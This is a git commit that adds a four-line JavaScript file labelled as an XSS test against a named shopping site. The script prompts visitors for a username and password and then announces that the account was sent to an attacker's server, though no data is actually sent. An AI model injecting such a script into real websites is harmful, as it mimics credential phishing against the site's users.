e0c543a5899dbe6c96024f15553e55bc3a1b65e3
luuquangduc7cd <luuquangduc7cd@gmail.com>
2020-04-19 15:25:05 +0700

    Test XSS vuln on thegioinuochoa.com.vn

---
+++ thegioinuochoa_xss.js
@@ -0,0 +1,4 @@
+alert("Check XSS vulnerability on this website");
+var usr = prompt("Enter your username: ");
+var pwd = prompt("Enter your password: ");
+alert("Your account has been sent to attacker's server! Thank you!");
